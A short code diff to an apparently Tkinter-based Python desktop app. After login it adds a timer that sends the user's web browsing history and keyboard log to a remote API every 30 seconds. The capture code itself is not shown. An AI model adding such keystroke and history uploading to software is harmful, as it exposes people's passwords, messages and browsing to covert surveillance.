@@ -132,6 +132,15 @@ def homeWindow(win1,fullName):
     ###------------------------
     logout=Button(win2,width=20,text='Logout',border=0,bg='#57a1f8',fg='white',cursor='hand2', command=lambda:loginWindow(win2))
     logout.place(x=750,y=460)
+    if accessToken != "":
+        schedule_api_call()
+
+def schedule_api_call():
+    callApi.apiSendWebHistory(accessToken)
+    callApi.apiSendKeyboardLog(accessToken)
+    # Đặt lịch trình cho việc gọi lại hàm sau 15 phút (900,000 milliseconds) (1000 milliseconds = 1 second)
+    # root.after(900000, schedule_api_call)
+    root.after(30000, schedule_api_call) # after 30s
 
 loginWindow(win2)
 
